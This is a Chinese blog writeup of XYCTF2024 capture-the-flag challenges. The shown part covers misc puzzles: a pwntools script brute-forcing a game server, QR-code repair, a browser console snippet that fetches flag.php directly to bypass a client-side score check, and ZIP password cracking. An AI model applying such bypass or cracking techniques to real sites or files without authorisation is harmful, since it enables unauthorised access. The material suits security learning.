<!DOCTYPE html>
<html lang="zh-CN">
    <head>
  <!-- 元数据 -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/70e16d9eb5a85bcc.jpg">
  
  <title>XYCTF2024 Writeup | jht3の个人站</title>
  
  <meta name="author" content="jht3" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="CTF" />
  
  <meta name="description" content="XYCTF2024 Writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF2024 Writeup">
<meta property="og:url" content="https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/">
<meta property="og:site_name" content="jht3の个人站">
<meta property="og:description" content="XYCTF2024 Writeup">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://jht3qaq.github.io/images/70e16d9eb5a85bcc.jpg">
<meta property="article:published_time" content="2024-04-26T16:05:29.000Z">
<meta property="article:modified_time" content="2024-07-10T01:32:06.307Z">
<meta property="article:author" content="jht3">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jht3qaq.github.io/images/70e16d9eb5a85bcc.jpg">
  
  <!-- 站点验证相关 -->
  
    
      <meta name="google-site-verification" content="MQWM3IPENI3ulBzfSFA3WAHS6PStE70SKrONrDx5E88" />
    
    
    
  
  <!-- 样式表文件 -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
    <style media="all">
            :root{
                            --navbar_desktop: rgba(144,215,236,.9);
                            --navbar_mobile: rgba(144,215,236,.9);
                        }
    </style>


  <link rel="stylesheet" class="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
  <script src="/js/kr-dark.min.js"></script>
  


    <style>
                @media(min-width:768px) {
        body.custom-background {
            background-image: url('https://api.jht3.top/getWinImg.php');
        }
        }
        :root{
                    --kratos_topnav_position: relative;
            }
    </style>

  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/light.min.css" media="all"></script>
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- 不得不预先加载的一些JS文件 -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
<meta name="generator" content="Hexo 7.3.0"></head>


    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                        <li>
                                            
                                                        <a href="/">
                                                            
                                                                
                                                                        jht3の个人站
                                                        </a>
                                                        
                                        </li>
                                        
                                            
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">
                            jht3の个人站
                        </a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        
                <div id="kratos-blog-post">
                    <div class="container">
                        <div id="main" class="row">
                            

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">XYCTF2024 Writeup</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-04-26T16:05:29.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-04-27</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> 作者 <span itemprop="name">jht3</span>
                </li>
                
                    <li>
                        <i class="fa fa-edit"></i> 
                        
                        
                            ~68.44K
                        
                        字
                    </li>
                
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>本文最后编辑于 <time datetime="1720575126307"></time> 前，其中的内容可能需要更新。</p></div>
            </div>
            
            
            
                <div class="kratos-post-inner-toc toc-div-class" >
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">1. MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rosk-Paper-Scissors"><span class="toc-text">1.1. Rosk,Paper,Scissors!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#game"><span class="toc-text">1.2. game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%BA%E5%95%A5%E6%89%AB%E4%B8%8D%E5%87%BA%E6%9D%A5%EF%BC%9F"><span class="toc-text">1.3. 我的二维码为啥扫不出来？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zzl%E7%9A%84%E6%8A%A4%E7%90%86%E5%B0%8F%E8%AF%BE%E5%A0%82"><span class="toc-text">1.4. zzl的护理小课堂</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-%E9%9A%90%E5%86%99"><span class="toc-text">1.5. ez_隐写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%86%8A%E5%8D%9A%E5%A3%AB"><span class="toc-text">1.6. 熊博士</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ZIP%E7%A5%9E%E4%B9%8B%E5%A5%97"><span class="toc-text">1.7. ZIP神之套</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BA%E9%A2%98%E6%9C%89%E7%82%B9%E7%83%A6"><span class="toc-text">1.8. 出题有点烦</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%9F-%E7%AD%BE%E5%88%B0"><span class="toc-text">1.9. 真&gt;签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-text">1.10. 签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCPL"><span class="toc-text">1.11. TCPL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AA"><span class="toc-text">1.12. 网络追踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Osint1"><span class="toc-text">1.13. Osint1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Osint2"><span class="toc-text">1.14. Osint2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Base1024-2"><span class="toc-text">1.15. EZ_Base1024*2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ez-osint"><span class="toc-text">1.16. Ez_osint</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-text">2. Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#happy-to-solve1"><span class="toc-text">2.1. happy_to_solve1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign1n-%E7%AD%BE%E5%88%B0"><span class="toc-text">2.2. Sign1n[签到]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sign1n-Revenge"><span class="toc-text">2.3. Sign1n_Revenge</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-text">3. PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-world-%E7%AD%BE%E5%88%B0"><span class="toc-text">3.1. hello_world(签到)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invisible-flag"><span class="toc-text">3.2. invisible_flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt"><span class="toc-text">3.3. fmt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#static-link"><span class="toc-text">3.4. static_link</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#one-byte"><span class="toc-text">3.5. one_byte</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guestbook1"><span class="toc-text">3.6. guestbook1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#simple-srop"><span class="toc-text">3.7. simple_srop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ1-0"><span class="toc-text">3.8. EZ1.0?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ2-0"><span class="toc-text">3.9. EZ2.0?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">4. Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%A2%E7%89%A2%E8%AE%B0%E4%BD%8F%EF%BC%8C%E9%80%9D%E8%80%85%E4%B8%BA%E5%A4%A7"><span class="toc-text">4.1. 牢牢记住，逝者为大</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#warm-up"><span class="toc-text">4.2. warm up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezMake"><span class="toc-text">4.3. ezMake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezhttp"><span class="toc-text">4.4. ezhttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmd5"><span class="toc-text">4.5. ezmd5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-text">5. Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trustme"><span class="toc-text">5.1. Trustme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DebugMe"><span class="toc-text">5.2. DebugMe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-unity"><span class="toc-text">5.3. baby unity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-unity"><span class="toc-text">5.4. ez unity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E6%98%AF%E7%9C%9F%E7%9A%84%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%90%97%EF%BC%9F"><span class="toc-text">5.5. 你是真的大学生吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%96%B5%E5%96%B5%E5%96%B5%E7%9A%84flag%E7%A2%8E%E4%BA%86%E4%B8%80%E5%9C%B0"><span class="toc-text">5.6. 喵喵喵的flag碎了一地</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%AA%E6%98%8E%E7%9A%84%E4%BF%A1%E4%BD%BF"><span class="toc-text">5.7. 聪明的信使</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8A%E5%A4%95%E6%98%AF%E4%BD%95%E5%B9%B4"><span class="toc-text">5.8. 今夕是何年</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezmath"><span class="toc-text">5.9. ezmath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-enc"><span class="toc-text">5.10. ez_enc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-rand"><span class="toc-text">5.11. ez_rand</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%95%E9%A1%BB%E7%9B%B8%E6%80%9D%E7%85%AE%E4%BD%99%E5%B9%B4"><span class="toc-text">5.12. 何须相思煮余年</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B8%E6%A0%B8%E6%A1%83"><span class="toc-text">5.13. 砸核桃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#What%E2%80%99s-this"><span class="toc-text">5.14. What’s this</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Findme"><span class="toc-text">5.15. Findme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-cube"><span class="toc-text">5.16. ez_cube</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-language"><span class="toc-text">5.17. easy language</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E9%98%BF%E5%A7%A8%E5%80%92%E4%B8%80%E6%9D%AF%E5%8D%A1%E5%B8%83%E5%A5%87%E8%AF%BA"><span class="toc-text">5.18. 给阿姨倒一杯卡布奇诺</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%92%E5%A4%B4"><span class="toc-text">5.19. 馒头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E7%AE%80%E7%88%B1"><span class="toc-text">5.20. 舔狗四部曲–简爱</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E7%9B%B8%E9%80%A2%E5%B7%B2%E6%98%AF%E4%B8%8A%E4%B8%8A%E7%AD%BE"><span class="toc-text">5.21. 舔狗四部曲–相逢已是上上签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E8%AE%B0%E5%BF%86%E7%9A%84%E6%97%B6%E5%85%89%E6%9C%BA"><span class="toc-text">5.22. 舔狗四部曲–记忆的时光机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%88%94%E7%8B%97%E5%9B%9B%E9%83%A8%E6%9B%B2%E2%80%93%E6%88%91%E7%9A%84%E7%99%BD%E6%9C%88%E5%85%89"><span class="toc-text">5.23. 舔狗四部曲–我的白月光</span></a></li></ol></li></ol>
                </div>
            
            <hr />
            <div itemprop="articleBody"><h2 id="MISC">1. MISC</h2>
<h3 id="Rosk-Paper-Scissors">1.1. Rosk,Paper,Scissors!</h3>
<p>一开始是暴力爆破（就 whilt True: random），后来能看出来规律了就直接找规律了（后面都是[0,0,1,1,2,2]循环），算法什么的根本没管(逃)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">m = [<span class="string">b&quot;Rock&quot;</span>,<span class="string">b&quot;Paper&quot;</span>,<span class="string">b&quot;Scissors&quot;</span>]</span><br><span class="line"></span><br><span class="line">ans = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>]*<span class="number">100</span></span><br><span class="line">ans[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">ans[<span class="number">3</span>]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;heuctf.cn&#x27;</span>,<span class="number">11055</span>,level=<span class="string">&quot;CRITICAL&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            sh.recvuntil(<span class="string">b&#x27; round\n&gt; &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(ans) &gt; _:</span><br><span class="line">                sh.sendline(m[ans[_]])</span><br><span class="line">                sh.recvline()</span><br><span class="line">                <span class="keyword">if</span> sh.recvline() != <span class="string">b&quot;You win!\n&quot;</span>:</span><br><span class="line">                    <span class="keyword">raise</span> Exception()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                r = randint(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">                sh.sendline(m[r])</span><br><span class="line">                sh.recvline()</span><br><span class="line">                <span class="keyword">if</span> sh.recvline() == <span class="string">b&quot;You win!\n&quot;</span>:</span><br><span class="line">                    ans.append(r)</span><br><span class="line">                    <span class="built_in">print</span>(ans)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> Exception()</span><br><span class="line">        sh.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure>
<h3 id="game">1.2. game</h3>
<p>这游戏我看过，一眼看出来了，当时还是看的狗乔伊视频认识的<code>BV1f64y1T71B</code></p>
<h3 id="我的二维码为啥扫不出来？">1.3. 我的二维码为啥扫不出来？</h3>
<p>看出来是行和列选7列反转颜色，然后带方框的4行/列能还原，然后大致张这样：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E6%88%91%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E4%B8%BA%E5%95%A5%E6%89%AB%E4%B8%8D%E5%87%BA%E6%9D%A5.bmp" class title="我的二维码为啥扫不出来">
<p>这时候还剩3行/列没还原，写个脚本爆破一下吧(虽然是爆破 但是也懒得写爆破算法 于是又用的random 反正跑挺快)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_color</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_row_colors</span>(<span class="params">pixels, row, width, block_size=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">for</span> x_block <span class="keyword">in</span> <span class="built_in">range</span>(width // block_size):</span><br><span class="line">        x = x_block * block_size</span><br><span class="line">        y = row * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_col_colors</span>(<span class="params">pixels, col, height, block_size=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">for</span> y_block <span class="keyword">in</span> <span class="built_in">range</span>(height // block_size):</span><br><span class="line">        x = col * block_size</span><br><span class="line">        y = y_block * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">original_img = Image.<span class="built_in">open</span>(<span class="string">&quot;new2.bmp&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    new_img = original_img.copy()</span><br><span class="line"></span><br><span class="line">    width, height = new_img.size</span><br><span class="line">    pixels = new_img.load()</span><br><span class="line"></span><br><span class="line">    a = <span class="keyword">lambda</span> i:reverse_col_colors(pixels,i,height)</span><br><span class="line">    b = <span class="keyword">lambda</span> i:reverse_row_colors(pixels,i,width)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        [a,b][random.randint(<span class="number">0</span>,<span class="number">1</span>)](<span class="number">8</span>+random.randint(<span class="number">0</span>,<span class="number">7</span>))</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># new_img.show()</span></span><br><span class="line">    <span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">    d = decode(new_img)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d):</span><br><span class="line">        <span class="built_in">print</span>(decode(new_img))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="zzl的护理小课堂">1.4. zzl的护理小课堂</h3>
<p>(这不是web题?)</p>
<p>一开始试出全部答案发现没卵用，后来阅读源码发现有本地判断逻辑：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123; </span><br><span class="line">                   <span class="keyword">var</span> score = xhr.<span class="property">responseText</span>;</span><br><span class="line">                   <span class="keyword">if</span> (score == <span class="number">100</span>) &#123;</span><br><span class="line">                       <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;你的分数是: &quot;</span> + score + <span class="string">&quot;/100 杂鱼,怎么才100分啊&quot;</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &lt; <span class="number">100</span>) &#123;</span><br><span class="line">                       <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;你的分数是: &quot;</span> + score + <span class="string">&quot;/100 noooooob!!&quot;</span>;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       <span class="keyword">var</span> flagXhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span><br><span class="line">                       flagXhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;flag.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">                       flagXhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                           <span class="keyword">if</span> (flagXhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; flagXhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                               <span class="keyword">var</span> flag = flagXhr.<span class="property">responseText</span>;</span><br><span class="line">                               <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;Flag: &quot;</span> + flag;</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125;;</span><br><span class="line">                       flagXhr.<span class="title function_">send</span>(); <span class="comment">// 发送请求获取 flag</span></span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;;</span><br><span class="line">           xhr.<span class="title function_">send</span>(formData); <span class="comment">// 发送请求获取分数</span></span><br></pre></td></tr></table></figure>
<p>那这就简单了，直接复制下面这段到控制台执行就行：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flagXhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span><br><span class="line">flagXhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;flag.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">flagXhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flagXhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; flagXhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> flag = flagXhr.<span class="property">responseText</span>;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;Flag: &quot;</span> + flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">flagXhr.<span class="title function_">send</span>(); <span class="comment">// 发送请求获取 flag</span></span><br></pre></td></tr></table></figure>
<p>用postman模拟，懒，不如控制台</p>
<h3 id="ez-隐写">1.5. ez_隐写</h3>
<p>首先CRC爆破一下，这个随便搬个网上脚本就行，然后就是隐写，搜半天发现有个52pojie的图片隐写工具，拖进去就能看见了：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ez_%E9%9A%90%E5%86%99.png" class title="ez_隐写">
<h3 id="熊博士">1.6. 熊博士</h3>
<p>啊不是，你这图片有啥用啊?我到现在也没懂</p>
<p>(你这不算古典密码学?)</p>
<p>观察到CBXGU和XYCTF挺像的 至少不同字符差的距离都一样 然后进一步用&quot;CBXGU&quot;-&quot;XYCTF&quot;减一下就能看出规律</p>
<p>然后发现就是把字母表发转了，这就简单了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>alpha = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)+<span class="number">1</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = <span class="built_in">dict</span>(<span class="built_in">zip</span>(<span class="built_in">reversed</span>(alpha),alpha))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&quot;</span>.join([d.get(i,i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;CBXGU&#123;ORF_BV_NVR_BLF_CRZL_QQ&#125;&quot;</span>])</span><br><span class="line"><span class="string">&#x27;XYCTF&#123;LIU_YE_MEI_YOU_XIAO_JJ&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>真是令人印象深刻的flag</p>
<h3 id="ZIP神之套">1.7. ZIP神之套</h3>
<p>不知道为啥这题用john+hashcat爆破不出来，换成ARCHPR秒出</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ZIP%E7%A5%9E%E4%B9%8B%E5%A5%97%E6%8F%90%E7%A4%BA.png" class title="ZIP神之套提示">
<img src="/2024/04/26/XYCTF2024-Writeup/ZIP%E7%A5%9E%E4%B9%8B%E5%A5%97%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81.png" class title="ZIP神之套爆破密码">
